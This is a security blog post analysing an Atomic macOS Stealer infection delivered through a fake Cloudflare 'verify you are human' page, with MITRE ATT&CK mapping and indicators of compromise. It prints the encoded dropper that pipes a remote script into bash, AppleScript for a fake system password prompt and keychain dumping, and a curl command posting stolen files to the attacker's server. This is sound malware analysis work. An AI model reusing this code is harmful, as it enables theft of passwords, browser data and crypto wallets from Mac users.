---
title : Atomic macOS Stealer (AMOS) Part 1
tags: [Malware, MacOs, Stealer, AMOS]
comment: true
style: border
color: dark
description: A Ovierview About new forms AMOS which is have faced .
---


## summary 
The Atomic macOS Stealer (AMOS) is malicious software that steals sensitive data from macOS systems. It captures keychain passwords, system information, files from the desktop and documents directories, and macOS user passwords. The malware also targets browser data, such as cookies and login passwords, as well as cryptocurrency wallets.


In this blog we are going to see an overview a new Forms AMOS which  i have faced . 




-----

# The "Verify to Continue" Trap: Dissecting a macOS Info-Stealer Attack

As defenders, we often see malware delivered via email attachments or malicious downloads. However, a rising trend involves "Copy-Paste Compromises," where users are socially engineered into running malicious commands directly in their terminal.

I recently analyzed an incident involving a macOS endpoint targeted by an info-stealer variant (likely **Amos Stealer**). The attack vector was a fake Cloudflare verification page that tricked the user into executing a Base64-encoded payload.

Below is a technical breakdown of the attack chain, a deep dive into the malicious code, and the MITRE ATT\&CK mapping.

## 1\. The Infection Vector: Social Engineering

The incident began when a device encountered a website mimicking a legitimate Cloudflare human verification page. Instead of a standard CAPTCHA, the site displayed a "verification code" that the visitor was instructed to copy and paste into their terminal to "prove they were human."

The "verification code" was actually a malicious Bash command designed to bypass browser download protections.

## 2\. Stage 1: The Dropper

The command executed on the terminal was a Base64-encoded string echoing into `bash`.

**The malicious command:**

```bash
echo "Y3VybCAtcyBodHRwczovL2dhbW1hLnBsYWluZmVuYXNzb2NpYXRlcy5jb20vc3RyaXgvaW5kZXgucGhwIHwgbm9odXAgYmFzaCAm" | base64 -d | bash
```

**Decoded, this translates to:**

```bash
curl -s https://gamma[.]plainfenassociates[.]com/strix/index.php | nohup bash &
```

## 3\. Stage 2: The Payload (Script Analysis)

The script downloaded by the initial command was a sophisticated AppleScript (OSASCRIPT). I have reversed the script to identify its core modules. Below is an analysis of the most critical functions found in the malware code.

### A. The Phishing Loop (`getpwd` function)

The malware does not use an exploit to gain root privileges; it simply asks for them. The `getpwd` function runs an infinite loop that creates a fake system dialog.

```applescript
on getpwd(username, writemind)
    try
        if checkvalid(username, "") then
             -- Logic to dump chrome passwords if already auth'd
        else
            repeat
                set result to display dialog "In order to process action required. Input device password to authorize your access:" default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "macOS Protection Service" with hidden answer
                set password_entered to text returned of result
                if checkvalid(username, password_entered) then
                    return password_entered
                end if
            end repeat
        end if
    end try
    return ""
end getpwd
```

  * **Technique:** It mimics a native macOS prompt titled **"macOS Protection Service."**
  * **Validation:** It uses the `checkvalid` function to run `dscl . authonly` against the input. It will not stop prompting until the user enters the correct system password.

### B. Targeting Crypto Wallets (`firewallets` & `walletMap`)

The script contains a hardcoded list (`walletMap`) of over 15 distinct desktop wallet applications and a function `firewallets` to scrape browser extensions.

**Targeted Desktop Apps include:**

  * Electrum, Coinomi, Exodus, Atomic, Wasabi, Ledger Live, Monero, Bitcoin Core, and Trezor Suite.

**Targeted Browser Extensions:**

  * MetaMask (`webextension@metamask.io`) and BNB Chain Wallet.

### C. Browser & Extension Theft (`chromium`)

The script iterates through a mapped list of Chromium-based browsers (`chromiumMap`), including Chrome, Brave, Edge, Opera, Vivaldi, and **Arc**.

For every browser profile found, it extracts:

1.  **Cookies:** `/Cookies` and `/Network/Cookies`
2.  **Login Data:** `/Login Data` (SQL database of saved passwords)
3.  **Extensions:** It specifically grabs `IndexedDB` folders for known crypto extensions (e.g., `nkbihfbeogaeaoehlefnkodbefgpgknn` for MetaMask).

### D. File Grabbing (`filegrabber`)

This function aggressively scrapes the user's `Desktop` and `Documents` folders. It filters files based on specific extensions that usually indicate sensitive data:

```applescript
set extensionsList to {"txt", "pdf", "docx", "wallet", "key", "keys", "doc", "jpeg", "png", "kdbx", "rtf", "jpg"}
```

  * It also steals the **Apple Notes** database (`NoteStore.sqlite`) and the entire **Keychain** directory (`/Library/Keychains/`).

### E. Exfiltration (`send_data`)

Once the data is collected, it is zipped to `/tmp/salmonela.zip` and exfiltrated via `curl`.

```applescript
on send_data(attempt, outUsername, serverIP, isBot)
    try
        set result_send to (do shell script "curl -X POST -H \"X-Bid: " & "f48fbe39836779cadbf148b5952919fd" & "\" -F \"lil-arch=@/tmp/salmonela.zip\" https://plainfenassociates.com/api/data/receive")
    -- Error handling and retry logic
end send_data
```

## 4\. The Defense: Interception

In this instance, the EDR solution (Cortex XDR) successfully blocked the execution chain. The behavioral engine flagged the `curl | bash` sequence and the subsequent AppleScript execution attempt, preventing the exfiltration of the `/tmp/salmonela.zip` archive.

## 5\. MITRE ATT\&CK Mapping

| Tactic | ID | Technique | Context |
| :--- | :--- | :--- | :--- |
| **Initial Access** | T1189 | Drive-by Compromise | The fake verification landing page. |
| **Execution** | T1059.002 | AppleScript | The main payload logic. |
| **Defense Evasion** | T1027 | Obfuscated Files | Base64 encoding the initial curl command. |
| **Credential Access** | T1056.002 | GUI Input Capture | The fake "macOS Protection Service" password prompt. |
| **Credential Access** | T1555.003 | Keychain & Browsers | Dumping the Keychain and browser `Login Data`. |
| **Collection** | T1005 | Data from Local System | Scraping Desktop/Documents for `.kdbx` and `.wallet` files. |
| **Exfiltration** | T1048 | Alternative Protocol | POST request to `plainfenassociates[.]com`. |

## 6\. Indicators of Compromise (IOCs)

  * **C2 Domain:** `plainfenassociates[.]com`
  * **URL:** `https://plainfenassociates[.]com/api/data/receive`
  * **Staging Directory:** `/tmp/salmonela/`
  * **Staging File:** `/tmp/salmonela.zip`
  * **User Agent Script Hash:** `7df295522a8488fd0a30dd40adcd0b44ceef7c56c9de33499c54d8b861fe4081`

-----

## The Malicious Script


```applescript
on mkdir(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		do shell script "mkdir -p " & filePosixPath
	end try
end mkdir

-- [Helper functions readfile, FileName, Directory, writeText, readwrite, isDir omitted for brevity]

on checkvalid(username, password_entered)
	try
		set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
		if result is not equal to "" then
			return false
		else
			return true
		end if
	on error
		return false
	end try
end checkvalid

on getpwd(username, writemind)
	try
		if checkvalid(username, "") then
			set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
			writeText(result as string, writemind & "masterpass-chrome")
		else
			repeat
				set result to display dialog "In order to process action required. Input device password to authorize your access:" default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "macOS Protection Service" with hidden answer
				set password_entered to text returned of result
				if checkvalid(username, password_entered) then
					return password_entered
				end if
			end repeat
		end if
	end try
	return ""
end getpwd

-- [Chromium, Firefox, and Wallet stealing logic omitted for brevity]

on main()
	-- [Setup logic]
	set writemind to "/tmp/salmonela/"
    
    -- [Password Phishing Trigger]
	if not checkvalid(username, password_entered) then
		set password_entered to getpwd(username, writemind)
		writeText(password_entered, systemProfile & "/.pwd")
	end if

    -- [Data Collection Triggers]
	try
		filegrabber(writemind)
	end try
    -- [Browser/Wallet Iteration]
	
    -- [Compression and Exfiltration]
	do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/salmonela.zip"
	send_data(0, outUsername, serverIP, isBot)
	do shell script "rm -r " & writemind
	do shell script "rm /tmp/salmonela.zip"
end main

main()
```


used AI for grammatical mistake  correction !!!!:!